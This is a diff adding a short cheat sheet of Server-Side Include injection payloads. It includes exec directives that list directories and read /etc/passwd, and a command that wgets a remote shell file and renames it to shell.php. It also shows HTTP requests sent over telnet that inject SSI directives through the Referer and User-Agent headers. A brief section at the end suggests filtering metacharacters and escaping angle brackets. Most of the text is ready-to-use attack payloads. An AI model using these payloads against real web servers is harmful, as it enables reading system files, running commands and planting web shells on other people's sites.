@@ -1,0 +1,73 @@
+Current Data
+============
+<!--#echo var="DATE_LOCAL" -->
+
+
+
+
+
+List The files
+==============
+<!--#exec cmd="ls" -->
+
+
+
+Access Different Sites
+======================
+<!--#exec cmd="cd /root/dir/">
+<!--#exec cmd="cd /root/dir/;ls">
+<!--#exec cmd="cd /root/dir/;ls;cat /etc/passwd">
+
+
+
+download Shell on Website
+=========================
+<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
+
+
+
+
+
+Injection in HTTP Headers
+=========================
+GET / HTTP/1.0
+Referer: <!--#exec cmd="/bin/ps ax"-->
+User-Agent: <!--#include virtual="/proc/version"-->
+
+
+
+
+
+Example:
+=======
+su-2.05# telnet localhost 80
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+GET / HTTP/1.0
+Referer: <!--#virtual include="somefile.log"-->
+User-Agent: <!--#exec cmd="/bin/id"-->
+
+
+Inserting Javascripts
+======================
+
+su-2.05# telnet localhost 80
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+GET / HTTP/1.0
+Referer: <javascript-that-is-evil-so-there's-no-need-for-examples>
+User-Agent: </html>
+
+
+Solution:
+=========
+
+1.(BEST WAY) Stripping out metacharacters like <>":;'}{][|\)(*&^%$#!`
+	This can help prevent html, JavaScript, php, sql injection, 
+	and SSI insertion.
+
+2. Replacing < and > with &gt; &lt;
+	By replacing < and > with &lt; and &gt; this helps prevent tag execution.
+	One obvious problem would be scripts with potential backtick "`" problems. 
